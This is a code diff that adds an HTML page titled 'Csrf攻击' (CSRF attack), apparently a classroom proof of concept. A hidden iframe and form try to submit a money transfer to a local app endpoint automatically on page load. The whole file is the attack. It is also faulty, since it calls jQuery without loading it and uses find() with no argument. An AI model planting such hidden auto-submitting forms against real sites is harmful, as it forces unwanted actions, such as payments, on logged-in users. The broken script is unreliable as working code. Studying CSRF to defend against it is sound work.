@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Csrf攻击</title>
+</head>
+<body>
+<iframe id="stealframe" src="" frameborder="0" style="width: 0; height: 0;"></iframe>
+<div id="box" style="height: 0; width: 0;">
+    <form action="http://127.0.0.1:8000/app11/app11-4/" method="post" id="myform">
+        <input type="text" name="phone" value="13145203486">
+        <input type="text" name="money" value="100">
+    </form>
+</div>
+<script>
+        window.onload = function () {
+            alert("hello");
+            $('#stealframe').contents().find().html($('#myform'));
+            $('#stealframe').contents().find().children('#myform').submit();
+        }
+    </script>
+</body>
+</html>
